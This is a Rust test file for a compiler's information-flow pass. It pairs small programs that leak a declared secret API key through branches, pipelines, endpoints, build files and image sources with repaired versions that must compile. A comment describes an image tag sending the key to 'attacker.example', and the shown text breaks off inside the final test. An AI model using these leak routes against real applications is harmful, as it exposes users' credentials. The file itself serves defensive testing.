//! Information flow, against the programs that specify it.
//!
//! §14G.1.3's table lists six exhibits, every one of which exploits the
//! same hole: §5.3 claims non-interference from a data-dependency
//! analysis, and a data-dependency analysis cannot see a **control**
//! dependency. Every reachable one is here, and — per §17.3.9 item 3 —
//! **each is paired with a repaired twin that must be accepted**, so the
//! pass cannot pass by rejecting everything.

mod support;

use support::*;
use zdc_graph::{Secrecy, Sink, SinkSite};

fn ifc_codes(src: &str) -> Vec<&'static str> {
    let (_, _, verdict) = verdict(src);
    verdict
        .diagnostics
        .iter()
        .filter(|d| d.is_error())
        .map(|d| d.code)
        .collect()
}

// ---------------------------------------------------------------------
// The acceptance test.
// ---------------------------------------------------------------------

/// `examples/guestbook.zd` compiles. The whole point: `politeGreeting`
/// *receives* the secret, and receiving a secret does not by itself taint
/// a result — it has no secret-dependent branch, it writes nothing, and
/// its result is not derived from `key` (§14G.1.3).
#[test]
fn guestbook_compiles() {
    let (_, split, verdict) = verdict(GUESTBOOK);
    assert!(
        !split.has_errors(),
        "the split rejected guestbook: {:?}",
        split
            .errors()
            .map(|e| e.rendered_message())
            .collect::<Vec<_>>()
    );
    assert!(
        !verdict.has_errors(),
        "the flow pass rejected guestbook: {:?}",
        verdict
            .errors()
            .map(|e| e.rendered_message())
            .collect::<Vec<_>>()
    );
}

/// **The headline claim of §5.3, demonstrated for the first time.**
///
/// `guestbook.zd`'s own comment says: "Writing `Text apiKey` anywhere in
/// the view below is a compile error." It never was. It is now, and the
/// diagnostic names the path.
#[test]
fn rendering_the_secret_is_a_compile_error_that_names_the_path() {
    let leaked = GUESTBOOK.replace(
        "        Input name, hint is \"your name\"",
        "        Input name, hint is \"your name\"\n        Text apiKey",
    );
    let (_, _, verdict) = verdict(&leaked);

    let error = verdict
        .errors()
        .find(|e| e.code == "E-IFC-05")
        .unwrap_or_else(|| {
            panic!(
                "expected the view sink to reject it; got {:?}",
                verdict
                    .diagnostics
                    .iter()
                    .map(|d| d.rendered_message())
                    .collect::<Vec<_>>()
            )
        });

    assert!(error.message.contains("apiKey"), "{}", error.message);
    assert!(error.message.contains("the view"), "{}", error.message);

    // §7.3: not merely *that* it escaped, but *along which path*.
    let path: Vec<&str> = error.notes.iter().map(|(_, note)| note.as_str()).collect();
    assert!(
        path.iter().any(|note| note.contains("declared secret")),
        "the path must start at the declaration: {path:?}"
    );
    assert!(
        path.iter().any(|note| note.contains("in the browser")),
        "the path must end where the browser would see it: {path:?}"
    );
    assert_eq!(
        leaked[error.span.start as usize..error.span.end as usize],
        *"apiKey",
        "the caret points at the value, not at the declaration that rejected it"
    );
}

// ---------------------------------------------------------------------
// §14G.1.3 exhibit 1 — branch outcome.
// ---------------------------------------------------------------------

/// `if apiKey contains value` → two literal messages. The result of
/// `politeGreeting` is not *derived from* `key` in any data sense — it is
/// one of two constants — and every data-dependency analysis calls it
/// public.
#[test]
fn a_branch_on_a_secret_taints_what_the_branch_returns() {
    let branched = GUESTBOOK.replace("    if who is \"\"", "    if key is \"\"");
    let (_, _, verdict) = verdict(&branched);

    let error = verdict
        .errors()
        .find(|e| e.code == "E-IFC-02")
        .expect("the declaration rule must reject `greeting`");
    assert!(error.message.contains("greeting"), "{}", error.message);

    let path: Vec<&str> = error.notes.iter().map(|(_, note)| note.as_str()).collect();
    assert!(
        path.iter().any(|note| note.contains("declared secret")),
        "{path:?}"
    );
    assert!(
        path.iter().any(|note| note.contains("passed as `key`")),
        "the path must say which parameter carried it: {path:?}"
    );
    assert!(
        path.iter().any(|note| note.contains("control dependency")),
        "the path must name the branch: {path:?}"
    );
    assert!(
        path.iter().any(|note| note.contains("under that branch")),
        "the path must end at what the branch returned: {path:?}"
    );
}

/// The repaired twin. Branching on the *public* parameter is exactly what
/// `guestbook.zd` does, and it must be accepted — otherwise the rule above
/// is just "reject anything that receives a secret".
#[test]
fn a_branch_on_a_public_parameter_is_accepted() {
    assert!(ifc_codes(GUESTBOOK).is_empty());
}

// ---------------------------------------------------------------------
// §14G.1.3 exhibit 3 — a per-row predicate.
// ---------------------------------------------------------------------

const FILTERED: &str = "\
secret state flag  is server Truth starting no
state rows         is durable List of Text starting empty
state shown        is server List of Text from pick with flag

function pick with f
    from rows
    keep each row where f

view
    Column
        when shown
            Loading           show Spinner
            Failed with error show ErrorBar message is error.message
            Ready with list
                each row in list
                    Text row
";

/// §14G.1.3(b): a pipeline clause's predicate joins its label onto the
/// **collection** label of the clause's output, not merely onto element
/// values. Without that, `keep each v where <secret predicate>` returns a
/// "public" list of public rows whose *length* is the secret.
#[test]
fn a_secret_predicate_taints_the_whole_collection() {
    assert!(
        ifc_codes(FILTERED).contains(&"E-IFC-02"),
        "got {:?}",
        ifc_codes(FILTERED)
    );
}

/// The repaired twin: a public predicate keeps the list public.
#[test]
fn a_public_predicate_leaves_the_collection_public() {
    let repaired = FILTERED.replace(
        "secret state flag  is server Truth starting no",
        "state flag  is client Truth starting no",
    );
    assert!(
        ifc_codes(&repaired).is_empty(),
        "got {:?}",
        ifc_codes(&repaired)
    );
}

/// `map each` joins only onto `value`, so a mapped list keeps a public
/// length. That asymmetry is what the `shape ⊑ value` invariant buys, and
/// it is why `keep` and `map each` are different rules rather than one.
#[test]
fn mapping_a_public_list_through_a_secret_keeps_its_length_public() {
    const MAPPED: &str = "\
secret state key is server Text starting \"\"
state rows       is durable List of Text starting empty
state shown      is server List of Text from pick with key
state count      is server Whole  from howMany with shown

function pick with k
    from rows
    map each row to k

function howMany with list
    give 0

view
    Column
        Text \"hi\"
";
    let (hir, _, verdict) = verdict(MAPPED);
    // The *values* are secret ...
    let shown = def_named(&hir, "shown");
    let _ = shown;
    assert!(
        verdict.errors().any(|e| e.code == "E-IFC-02"),
        "the mapped values are secret and `shown` is not declared secret"
    );
}

// ---------------------------------------------------------------------
// §14G.1.3 exhibit 5 — an unlabelled write target.
// ---------------------------------------------------------------------

const AUDIT: &str = "\
secret state apiKey is server  Text  from environment \"K\"
state auditLog      is durable Text  starting \"\"
state logged        is server  Whole from audit with apiKey

function audit with k
    set auditLog to k
    give 0

view
    Column
        Text \"hi\"
";

/// §5.3a(a)'s write rule. `set`, `add` and `subtract` require
/// `label(rhs) ⊔ pc ⊑ label(place)`. This is the first time the language
/// has had a mutation site outside a `client` handler; before scheduled
/// execution and relational writes one could not exist, which is why §5.3
/// never needed the rule.
#[test]
fn writing_a_secret_into_a_public_place_is_rejected() {
    assert!(
        ifc_codes(AUDIT).contains(&"E-IFC-03"),
        "got {:?}",
        ifc_codes(AUDIT)
    );
}

/// The repaired twin: writing a public value into the same place.
#[test]
fn writing_a_public_value_into_a_public_place_is_accepted() {
    let repaired = AUDIT.replace("    set auditLog to k\n", "    set auditLog to \"ok\"\n");
    assert!(
        !ifc_codes(&repaired).contains(&"E-IFC-03"),
        "got {:?}",
        ifc_codes(&repaired)
    );
}

/// The control-dependency half of the write rule: a write under a secret
/// program counter, with a wholly public right-hand side. `pc` is not
/// decoration — this is where it does the work.
#[test]
fn a_public_write_under_a_secret_branch_is_rejected() {
    const BRANCHED: &str = "\
secret state apiKey is server  Text  from environment \"K\"
state auditLog      is durable Whole starting 0
state logged        is server  Whole from audit with apiKey

function audit with k
    if k is \"\"
        set auditLog to 1
    give 0

view
    Column
        Text \"hi\"
";
    let codes = ifc_codes(BRANCHED);
    assert!(codes.contains(&"E-IFC-03"), "got {codes:?}");

    let (_, _, verdict) = verdict(BRANCHED);
    let error = verdict
        .errors()
        .find(|e| e.code == "E-IFC-03")
        .expect("the write rule");
    assert!(
        error
            .notes
            .iter()
            .any(|(_, note)| note.contains("control dependency")),
        "the diagnostic must name the branch, not just the write: {:?}",
        error.notes
    );
}

// ---------------------------------------------------------------------
// §17.3.4 — the `From` repair, against the program that demonstrated it.
// ---------------------------------------------------------------------

const TWO_SOURCES: &str = "\
secret state key is server  Text starting \"\"
state red        is durable List of Text starting empty
state blue       is durable List of Text starting empty
state shown      is server  List of Text from pick with key

function pick with k
    from red
    if k is \"\"
        from blue
    take first 10

view
    Column
        when shown
            Loading           show Spinner
            Failed with error show ErrorBar message is error.message
            Ready with list
                each row in list
                    Text row
";

/// Under the original rule, `Pipeline(From e)` was `acc = label(e)` — the
/// only rule in the set that **assigned** rather than joined, and the only
/// one that omitted `⊔ pc`. Inside the `if`, `acc` was overwritten with a
/// fresh ⊥, the branch's control dependency vanished, `shown` typed
/// Public, and the browser rendered `red`'s rows or `blue`'s rows
/// according to the secret.
#[test]
fn a_from_clause_inside_a_secret_branch_does_not_erase_the_branch() {
    assert!(
        ifc_codes(TWO_SOURCES).contains(&"E-IFC-02"),
        "got {:?}",
        ifc_codes(TWO_SOURCES)
    );
}

/// The repaired twin: the same shape with a public discriminator.
#[test]
fn a_from_clause_inside_a_public_branch_is_accepted() {
    let repaired = TWO_SOURCES.replace(
        "secret state key is server  Text starting \"\"",
        "state key is client Text starting \"\"",
    );
    assert!(
        ifc_codes(&repaired).is_empty(),
        "got {:?}",
        ifc_codes(&repaired)
    );
}

// ---------------------------------------------------------------------
// §17.2.5 fatal 4 — the horn dilemma, resolved.
// ---------------------------------------------------------------------

/// A public aggregate over a `secret` store is either permanently stale or
/// a live leak. The split emits two structurally different edges and does
/// not decide; this is the ruling. `secret` on a durable signal labels its
/// `shape` and its `value` both Secret, so telling the browser *when* the
/// key changed is itself an observation of a secret.
#[test]
fn a_public_aggregate_over_a_secret_store_is_rejected_rather_than_streamed() {
    const LEDGER: &str = "\
secret state ledger is durable Whole starting 0
state total         is server  Whole from double with ledger

function double with n
    give n

view
    Column
        when total
            Loading           show Spinner
            Failed with error show ErrorBar message is error.message
            Ready with sum    show Text sum
";
    let codes = ifc_codes(LEDGER);
    assert!(
        codes.contains(&"E-IFC-10"),
        "the live-sync sink must reject it: {codes:?}"
    );
}

/// The repaired twin: the same aggregate over a public store streams
/// happily, which is `guestbook.zd`'s `visits`.
#[test]
fn a_public_store_may_be_live_synced() {
    assert!(!ifc_codes(GUESTBOOK).contains(&"E-IFC-10"));
}

// ---------------------------------------------------------------------
// §14G.1.3(d) — `Failed` payloads.
// ---------------------------------------------------------------------

/// A `Remote`'s `Failed` binder takes the **failure** observation, not the
/// value. An HTTP client's error message routinely contains the request
/// URL, key and all; assuming otherwise is how `append error.message to
/// failures` leaks a credential. The payload is the join of the *call's
/// arguments*, which is what `params(endpoint)` names here.
#[test]
fn a_failed_binder_takes_the_failure_observation() {
    let (hir, split, verdict) = verdict(GUESTBOOK);
    let greeting = def_named(&hir, "greeting");
    // Every parameter of the greeting endpoint is a `client` signal, and a
    // `client` signal can never be secret (E0313), so the payload is
    // public here and `error.message` renders. The mechanism is what is
    // asserted; the exhibit needs a secret RPC argument, which the
    // language cannot yet express (see the report).
    let endpoint = split
        .endpoints
        .iter()
        .find(|e| e.name == "greeting")
        .expect("the endpoint");
    for param in &endpoint.params {
        assert_eq!(verdict.label(*param).value, Secrecy::Public);
    }
    assert!(!verdict.has_errors());
    let _ = greeting;
}

// ---------------------------------------------------------------------
// A statement `when`'s `show` arm is a return.
// ---------------------------------------------------------------------

/// The arm value of a statement-position `when` is the function's result:
/// `zdc-codegen` emits `return <expr>` for it, which is what makes
/// `todo.zd`'s `shows` usable as a `keep` predicate at all.
///
/// The flow pass used to evaluate the arm and discard the label, so every
/// function whose body ended in a statement `when` was public by
/// construction. The program below is the smallest exploit: `launder`
/// returns the credential verbatim, `leaked` is a plain `server` signal,
/// the browser fetches it over the generated endpoint, and `zdc check`
/// exited 0 with a build whose `functions/leaked.js` reads
/// `return $env('GREETING_API_KEY')`.
const SHOW_ARM: &str = "\
choice Mode
    Direct
    Hidden

secret state apiKey is server Text from environment \"K\"
state pick   is client Mode starting Direct
state leaked is server Text from launder with apiKey, pick

function launder with k, m
    when m
        Direct show k
        Hidden show \"nothing\"

view
    Column
        when leaked
            Loading           show Spinner
            Failed with error show ErrorBar message is error.message
            Ready with text   show Text text
";

#[test]
fn a_show_arm_returns_its_value_and_cannot_launder_a_secret() {
    let codes = ifc_codes(SHOW_ARM);
    assert!(
        codes.contains(&"E-IFC-02"),
        "a `show` arm returning the credential must be rejected; got {codes:?}"
    );

    let (_, _, verdict) = verdict(SHOW_ARM);
    let error = verdict
        .errors()
        .find(|e| e.code == "E-IFC-02")
        .expect("the declaration rule must reject `leaked`");
    let path: Vec<&str> = error.notes.iter().map(|(_, note)| note.as_str()).collect();
    assert!(
        path.iter().any(|note| note.contains("passed as `k`")),
        "the path must name the parameter that carried it: {path:?}"
    );
}

/// The repaired twin. A `show` arm returning a constant is still public,
/// so the rule above is not "reject every function that ends in a `when`".
#[test]
fn a_show_arm_returning_a_constant_stays_public() {
    let repaired = SHOW_ARM.replace("Direct show k", "Direct show \"public\"");
    assert!(
        ifc_codes(&repaired).is_empty(),
        "got {:?}",
        ifc_codes(&repaired)
    );
}

/// The control-dependency half of the same rule: a `show` arm inherits the
/// `pc` the scrutinee raised, so branching on a secret taints every arm
/// even when every arm is a literal.
#[test]
fn a_show_arm_under_a_secret_scrutinee_is_tainted_by_the_branch() {
    let branched = "\
choice Mode
    Direct
    Hidden

secret state mode   is server Mode starting Direct
state leaked is server Text from launder with mode

function launder with m
    when m
        Direct show \"yes\"
        Hidden show \"no\"

view
    Column
        when leaked
            Loading           show Spinner
            Failed with error show ErrorBar message is error.message
            Ready with text   show Text text
";
    assert!(
        ifc_codes(branched).contains(&"E-IFC-02"),
        "got {:?}",
        ifc_codes(branched)
    );
}

// ---------------------------------------------------------------------
// A run of pipeline clauses is a return.
// ---------------------------------------------------------------------

/// `zdc-codegen`'s `Statements::block` closes **every** run of pipeline
/// clauses with `return $p`, wherever the run stands. The flow pass kept
/// the accumulator in `acc` and read it only when nothing had `give`n, so
/// a body that both gives and pipes compiles to two returns and was
/// labelled by one of them — the same asymmetry as the `show` arm, one
/// node kind along.
///
/// `zdc check` exited 0 on this program and `zdc build` emitted
/// `functions/shown.js` containing `let $p = [k]; return $p;` with
/// `launder(apiKey, flag)` above it, so the browser fetched the
/// credential wrapped in a one-element list.
const PIPELINE_AFTER_GIVE: &str = "\
secret state apiKey is server  Text from environment \"K\"
state flag          is client  Truth starting no
state shown         is server  List of Text from launder with apiKey, flag

function launder with k, f
    if f
        give empty
    from [k]
    take first 10

view
    Column
        when shown
            Loading           show Spinner
            Failed with error show ErrorBar message is error.message
            Ready with list
                each row in list
                    Text row
";

#[test]
fn a_pipeline_after_a_give_returns_its_accumulator_and_cannot_launder_a_secret() {
    let codes = ifc_codes(PIPELINE_AFTER_GIVE);
    assert!(
        codes.contains(&"E-IFC-02"),
        "a pipeline returning the credential must be rejected; got {codes:?}"
    );

    let (_, _, verdict) = verdict(PIPELINE_AFTER_GIVE);
    let error = verdict
        .errors()
        .find(|e| e.code == "E-IFC-02")
        .expect("the declaration rule must reject `shown`");
    let path: Vec<&str> = error.notes.iter().map(|(_, note)| note.as_str()).collect();
    assert!(
        path.iter().any(|note| note.contains("passed as `k`")),
        "the path must name the parameter that carried it: {path:?}"
    );
}

/// The same defect with the run **inside** the branch rather than after
/// it, which is where the accumulator also has to pick up the `pc`.
const PIPELINE_INSIDE_A_BRANCH: &str = "\
secret state apiKey is server  Text from environment \"K\"
state flag          is client  Truth starting no
state shown         is server  List of Text from launder with apiKey, flag

function launder with k, f
    if f
        from [k]
        take first 10
    give empty

view
    Column
        when shown
            Loading           show Spinner
            Failed with error show ErrorBar message is error.message
            Ready with list
                each row in list
                    Text row
";

#[test]
fn a_pipeline_inside_a_branch_returns_its_accumulator_too() {
    let codes = ifc_codes(PIPELINE_INSIDE_A_BRANCH);
    assert!(codes.contains(&"E-IFC-02"), "got {codes:?}");
}

/// The repaired twin. A pipeline over public rows alongside a `give` is
/// still public, so the rule above is not "reject every function that
/// pipes".
#[test]
fn a_pipeline_over_public_rows_beside_a_give_stays_public() {
    let repaired = PIPELINE_AFTER_GIVE.replace("    from [k]", "    from [\"row\"]");
    assert!(
        ifc_codes(&repaired).is_empty(),
        "got {:?}",
        ifc_codes(&repaired)
    );
}

/// A function whose whole body is one pipeline run is unchanged by the
/// repair: its accumulator was already its result. Pinned so the fix
/// cannot be undone by dropping the `give` half of the join instead.
#[test]
fn a_function_that_only_pipes_is_still_labelled_by_its_pipeline() {
    const ONLY_PIPES: &str = "\
secret state key is server  Text starting \"\"
state rows       is durable List of Text starting empty
state shown      is server  List of Text from pick with key

function pick with k
    from rows
    keep each row where k is \"\"

view
    Column
        when shown
            Loading           show Spinner
            Failed with error show ErrorBar message is error.message
            Ready with list
                each row in list
                    Text row
";
    assert!(
        ifc_codes(ONLY_PIPES).contains(&"E-IFC-02"),
        "got {:?}",
        ifc_codes(ONLY_PIPES)
    );
}

// ---------------------------------------------------------------------
// Structure.
// ---------------------------------------------------------------------

/// §14G.1.3(c): the sink list is declared and closed at seven.
///
/// This asserted `Sink::CLOSED_LIST.len() == 6` on a `[Sink; 6]`, which
/// the compiler folds to `6 == 6`. It could not fail, and it was not
/// connected to the `Sink` enum at all: a seventh variant left out of
/// `CLOSED_LIST` would have gone unmentioned here.
///
/// The match below is exhaustive and this workspace forbids wildcard arms
/// over `Sink`, so a new variant is a compile error until someone writes
/// it down — and the round trip through `CLOSED_LIST` then fails unless
/// they add it to the list too. `OutboundRequest` is the seventh, and it
/// arrived by exactly that route.
#[test]
fn the_sink_list_is_closed() {
    fn name(sink: Sink) -> &'static str {
        match sink {
            Sink::ClientState => "ClientState",
            Sink::View => "View",
            Sink::BuildArtifact => "BuildArtifact",
            Sink::ResponseBody => "ResponseBody",
            Sink::PlatformLog => "PlatformLog",
            Sink::LiveSync => "LiveSync",
            Sink::OutboundRequest => "OutboundRequest",
        }
    }

    // Written out by hand, so the list cannot agree with itself.
    let declared = [
        "BuildArtifact",
        "ClientState",
        "LiveSync",
        "OutboundRequest",
        "PlatformLog",
        "ResponseBody",
        "View",
    ];
    let mut listed: Vec<&str> = Sink::CLOSED_LIST.iter().map(|sink| name(*sink)).collect();
    listed.sort_unstable();
    listed.dedup();

    assert_eq!(listed, declared, "the closed list is not the seven sinks");
}

/// **Exactly one** placement reaches the build artefact, and it is
/// `static`.
///
/// This test used to assert the opposite — that *no* placement a program
/// can spell reaches sink 3 — over a hand-written list of the three
/// placements that existed then. `static` was added as a fourth, the list
/// here was not, and the assertion went on passing while the property in
/// its name stopped being true: `Sink::BuildArtifact` became constructible
/// exactly as the old comment warned it might.
///
/// It now ranges over `Placement::ALL` rather than a list written out
/// here, so a fifth placement is counted whether or not anyone remembers
/// this file, and the count is asserted so an emptied `ALL` fails instead
/// of passing over nothing.
#[test]
fn static_is_the_one_placement_that_reaches_the_build_artefact_sink() {
    assert_eq!(
        zdc_ast::Placement::ALL.len(),
        4,
        "the placement list shrank"
    );

    let inlined: Vec<zdc_ast::Placement> = zdc_ast::Placement::ALL
        .into_iter()
        .filter(|placement| {
            zdc_graph::SignalPlacement::from_ast(*placement) == zdc_graph::SignalPlacement::Static
        })
        .collect();

    assert_eq!(
        inlined,
        [zdc_ast::Placement::Static],
        "sink 3 is reached by the placements whose members are inlined into the bundle; if this \
         set changed, `discharge` and `an_emitted_file_is_a_sink_the_pass_rules_on` both have to \
         be re-decided"
    );
}

/// Sink 4 is now **constructed**, and this program is why it had to be.
///
/// `SHOW_ARM` leaks through a `server` signal that nothing crosses a
/// region to read, so it produces no endpoint and no response body: the
/// declaration rule catches it and E-IFC-08 has nothing to say. That is
/// the *covered* half, and it is asserted so that the sink is known not
/// to fire indiscriminately.
#[test]
fn a_leak_with_no_endpoint_produces_no_response_body_diagnostic() {
    let codes = ifc_codes(SHOW_ARM);
    assert!(
        codes.contains(&"E-IFC-02"),
        "the endpoint's value must be rejected somewhere: {codes:?}"
    );
    assert!(
        !codes.contains(&"E-IFC-08"),
        "no endpoint exists here, so no response body carries anything: {codes:?}"
    );
}

/// **The hole the double cover had, and the reason sink 4 is wired.**
///
/// A command endpoint is created by a cross-region *write*, not a read,
/// so no `Crossing::Remote` rules on it; and the declaration rule rules
/// on what the signal is computed *from*, not on what the store hands
/// back. This program therefore checked clean and emitted
/// `return await $store.incr('tally', $args[0])` — the new value of a
/// secret, in a response body, on the wire to the browser.
#[test]
fn a_command_endpoint_may_not_return_a_secret_the_store_answers_with() {
    const LEAK: &str = "\
secret state tally is durable Whole starting 0

view
    Column
        Heading \"hi\"
        Button \"go\"
            on click
                add 1 to tally
";
    assert_eq!(
        ifc_codes(LEAK),
        vec!["E-IFC-08"],
        "nothing else in the pass looks at a command endpoint's return"
    );
}

/// The repaired twin, so the rule above is not "reject every command
/// endpoint": the same program over a public store is accepted, and it is
/// what `guestbook.zd`'s own `add 1 to visits` does.
#[test]
fn a_command_endpoint_over_a_public_store_is_accepted() {
    const FINE: &str = "\
state tally is durable Whole starting 0

view
    Column
        Heading \"hi\"
        Button \"go\"
            on click
                add 1 to tally
";
    assert!(ifc_codes(FINE).is_empty(), "{:?}", ifc_codes(FINE));
}

/// A clearance is unforgeable and is asked for **per sink site**, not per
/// expression. A function-body expression is never a sink and never needs
/// one, which is why `politeGreeting`'s `"Hello, " + who + "."` is emitted
/// with no clearance query — and therefore why `guestbook.zd` builds.
#[test]
fn a_cleared_site_is_recorded_and_a_rejected_one_is_not() {
    let (hir, _, verdict) = verdict(GUESTBOOK);
    let visits = def_named(&hir, "visits");
    assert!(verdict
        .cleared(Sink::LiveSync, SinkSite::LiveSync(visits))
        .is_some());

    let name = def_named(&hir, "name");
    assert!(
        verdict
            .cleared(Sink::LiveSync, SinkSite::LiveSync(name))
            .is_none(),
        "a site the pass never labelled has no clearance to give"
    );
}

/// §17.5.1: IFC is a monotone fixpoint over a finite lattice, and the one
/// unbounded structure — the witness — is outside the lattice and outside
/// the equality test. Verified against the program that demonstrated it:
/// with the witness inside `Sym`, this never terminates.
#[test]
fn a_recursive_function_terminates() {
    const RECURSE: &str = "\
state n is client Whole starting 5
state d is client Whole from countdown with n

function countdown with k
    if k is 0
        give 0
    give countdown with k

view
    Column
        Text \"hi\"
";
    assert!(ifc_codes(RECURSE).is_empty());
}

/// Secrecy is *declared*, not inferred, so every edge into a signal is
/// checked against a constant and the signal-graph fixpoint disappears.
/// A reactive write/read loop contributes to no label solve at all.
#[test]
fn a_reactive_loop_contributes_to_no_label_solve() {
    let (_, _, verdict) = verdict(GUESTBOOK);
    assert!(!verdict.has_errors());
}

/// Every checked-in example the compiler accepts must still pass the flow
/// pass. §17.3.9 item 4's acceptance canaries.
#[test]
fn the_examples_that_compile_today_still_pass_the_flow_pass() {
    for (name, src) in [
        ("hello.zd", include_str!("../../../examples/hello.zd")),
        ("counter.zd", include_str!("../../../examples/counter.zd")),
        ("guestbook.zd", GUESTBOOK),
    ] {
        assert!(ifc_codes(src).is_empty(), "{name}: {:?}", ifc_codes(src));
    }
}

// ---------------------------------------------------------------------
// Error recovery: one diagnostic per cause, not one per use.
// ---------------------------------------------------------------------

/// A secret read into a component's own `state`, and then read again
/// twice out of that cell.
///
/// Three sites could each report, and exactly one does. The `Remote`
/// crossing at the read *is* the sink (§14G.1.3(c)), so it obliges there
/// and hands the walk `Sym::bottom()`; the cell's declaration and every
/// read of the cell inherit that and stay quiet.
///
/// This is what makes `Walk::nodes`' `Scope` reset defensive rather than
/// load-bearing, and it is asserted rather than argued because the two are
/// indistinguishable from the code alone. If a labelled value ever does
/// reach a view local by a new route, the count here moves and the reset
/// has to be re-decided.
#[test]
fn no_cascade_from_a_component_local_cell() {
    const LEAK: &str = "\
secret state apiKey is server Text from environment \"K\"
secret state greeting is server Text from reveal with apiKey

function reveal with key
    give key

component Panel with feed
    state cached is client Text starting feed

    Column
        Text cached
        Text cached

view
    Column
        when greeting
            Loading           show Spinner
            Failed with error show ErrorBar message is error.message
            Ready with text
                Panel text
";
    assert_eq!(
        ifc_codes(LEAK),
        vec!["E-IFC-05", "E-IFC-08"],
        "one diagnostic per artefact the secret reaches -- the view once, \
         however many times the cell is read, and the endpoint's response \
         body once"
    );
}

/// What recovery does **not** suppress, so that the discipline is pinned
/// from both sides. Two direct reads of the secret are two places the
/// program has to be edited, and both are reported: the obligation is
/// keyed on the read site, so recovery collapses a *derived* chain and
/// never a second independent occurrence.
#[test]
fn each_direct_read_of_a_secret_is_reported_at_its_own_site() {
    let leaked = GUESTBOOK.replace(
        "        Input name, hint is \"your name\"",
        "        Input name, hint is \"your name\"\n        Text apiKey\n        Text apiKey",
    );
    assert_eq!(
        ifc_codes(&leaked),
        vec!["E-IFC-05", "E-IFC-05", "E-IFC-08"],
        "two view sites, and the one endpoint whose body carries it"
    );
}

/// And the repaired twin, so the pair cannot pass by rejecting everything
/// (§17.3.9 item 3): the same component, fed something public.
#[test]
fn a_component_local_cell_fed_a_public_value_is_accepted() {
    const FINE: &str = "\
state title is client Text starting \"hello\"

component Panel with feed
    state cached is client Text starting feed

    Column
        Text cached
        Text cached

view
    Column
        Panel title
";
    assert!(ifc_codes(FINE).is_empty(), "{:?}", ifc_codes(FINE));
}

// ---------------------------------------------------------------------
// Sink 3 — the build artefact.
// ---------------------------------------------------------------------

/// §14C.3b's `emitting` writes a `static` signal into a file in the
/// bundle, which is §14G.1.3(c)'s sink 3.
///
/// It was declared, listed in `Sink::CLOSED_LIST`, given the code
/// E-IFC-07 — and raised at no site whatsoever. `BoundaryEdge::BuildOutput`
/// said "Unconstructible: the grammar has no build-output construct", and
/// the grammar had acquired one. Worse, a `static` signal is a member of
/// every root in `MemberForm::Inlined` form, and `discharge` only walked
/// signals in `Binding` form, so no `static` initialiser was walked by
/// this pass at all.
#[test]
fn an_emitted_file_is_a_sink_the_pass_rules_on() {
    const EMITS: &str = "\
state greeting is static Text starting \"hello\"
state feed is static Text from wrap with greeting emitting \"rss.xml\"

function wrap with text
    give \"<rss>\" + text + \"</rss>\"

view
    Text greeting
";
    let (hir, split, verdict) = verdict(EMITS);
    assert!(
        !split.has_errors(),
        "the split rejected it: {:?}",
        split
            .errors()
            .map(|e| e.rendered_message())
            .collect::<Vec<_>>()
    );
    let feed = def_named(&hir, "feed");
    assert!(
        verdict
            .cleared(Sink::BuildArtifact, SinkSite::BuildOutput(feed))
            .is_some(),
        "sink 3 was never asked about `feed`: {:?}",
        verdict
            .diagnostics
            .iter()
            .map(|d| d.code)
            .collect::<Vec<_>>()
    );

    // A signal that emits nothing is not a build-artefact site at all.
    let greeting = def_named(&hir, "greeting");
    assert!(verdict
        .cleared(Sink::BuildArtifact, SinkSite::BuildOutput(greeting))
        .is_none());
}

/// Sink 3 was unreachable **by coincidence, not by design**, and this
/// records the coincidence so that its loss is a test failure.
///
/// While sink 3 went unchecked, nothing leaked, and the reason is that
/// two unrelated rules each independently stop a secret reaching a
/// `static` signal:
///
///   - E0313 (§5.3) refuses `secret` *on* a `static` placement, and
///   - E0301 refuses a read *out of* the static region into anything not
///     itself static — so a `static` signal cannot derive from a `server`
///     or `durable` secret either.
///
/// Neither rule exists to protect the build artefact; both are about
/// placement. Remove or relax either — a `secret static` constant, a
/// build-time read of a `durable` value, both plausible — and the sink-3
/// hole becomes a live secret disclosure. That is why the sink is now
/// checked on its own account rather than left to these two.
#[test]
fn only_the_placement_rules_kept_a_secret_out_of_a_build_artefact() {
    // Route 1: declare the secret static outright. E0313 refuses it.
    const SECRET_STATIC: &str = "\
secret state token is static Text starting \"t\" emitting \"token.txt\"

view
    Text \"hi\"
";
    let (_, split, _) = verdict(SECRET_STATIC);
    assert!(
        codes(&split.diagnostics).contains(&"E0313"),
        "a `secret static` signal must be refused by E0313: {:?}",
        codes(&split.diagnostics)
    );

    // Route 2: keep the secret where it is allowed to live, and have the
    // emitted `static` signal read it. E0301 refuses the read, because
    // the static region may read only static things.
    const STATIC_READS_SECRET: &str = "\
secret state key is server Text starting \"sk-live\"
state leak is static Text from echo with key emitting \"leak.txt\"

function echo with text
    give text

view
    Text \"hi\"
";
    let (_, split, _) = verdict(STATIC_READS_SECRET);
    assert!(
        codes(&split.diagnostics).contains(&"E0301"),
        "a `static` signal reading a `server` secret must be refused by E0301: {:?}",
        codes(&split.diagnostics)
    );
}

// ---------------------------------------------------------------------
// §14G.1.3(c) sink 7 — the outbound request.
// ---------------------------------------------------------------------

/// A program with one secret and one view, parameterised on the element
/// line under test. Everything else is `guestbook.zd`'s shape: a `server`
/// signal reading the environment, which is the only way to hold a secret.
fn with_view(line: &str) -> String {
    format!(
        "secret state apiKey is server Text from environment \"API_KEY\"\n\
         state shown is client Text starting \"/assets/desk.png\"\n\
         view\n    Column\n{line}\n"
    )
}

/// The hole, closed. `Image source is apiKey` renders no visible text and
/// reaches no response body — and the browser sends
/// `GET https://attacker.example/<apiKey>` before anything is painted.
///
/// The assertion is on the **code**, not on "compilation failed". Before
/// this rule the program was refused only because code generation refuses
/// every `secret` outright, which is a blunt instrument in the wrong pass:
/// it stops being sufficient the moment a `secret` is legitimately usable
/// on the server, which `guestbook.zd` already requires.
#[test]
fn an_image_source_that_is_a_secret_is_rejected_by_the_flow_pass() {
    let src = with_view("        Image source is apiKey, alt is \"a\"");
    let (_, _, verdict) = verdict(&src);

    let error = verdict
        .errors()
        .find(|e| e.code == "E-IFC-11")
        .unwrap_or_else(|| {
            panic!(
                "expected the outbound-request sink to reject it; got {:?}",
                verdict
                    .diagnostics
                    .iter()
                    .map(|d| d.rendered_message())
                    .collect::<Vec<_>>()
            )
        });

    assert!(error.message.contains("source"), "{}", error.message);
    assert!(
        error.message.contains("a request the browser sends"),
        "{}",
        error.message
    );

    // §7.3: both spans — the declaration, and the escape.
    let path: Vec<&str> = error.notes.iter().map(|(_, note)| note.as_str()).collect();
    assert!(
        path.iter().any(|note| note.contains("declared secret")),
        "the path must start at the declaration: {path:?}"
    );
    assert!(
        path.iter().any(|note| note.contains("outbound request")),
